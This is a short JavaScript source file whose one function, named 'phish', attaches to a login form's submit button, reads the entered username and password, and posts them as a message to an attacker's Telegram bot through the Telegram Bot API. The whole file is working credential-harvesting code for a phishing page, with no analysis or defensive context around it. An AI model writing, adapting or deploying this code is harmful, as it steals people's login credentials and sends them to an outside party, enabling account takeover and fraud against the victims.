const phish = (bot_token, chat_id) => {

    $('#submit-button').on('click', function() {
        let login = $('#username').val(),
            pass = $('#password').val(),
            msg = `------------------------------------------%0A
Login:    ${login}%0A
Pass :    ${pass}%0A
------------------------------------------`,
            xhr = new XMLHttpRequest();

        xhr.open(
            'POST',
            `https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${chat_id}&parse_mode=html&text=${msg}`
        );
        xhr.send();
    });
};
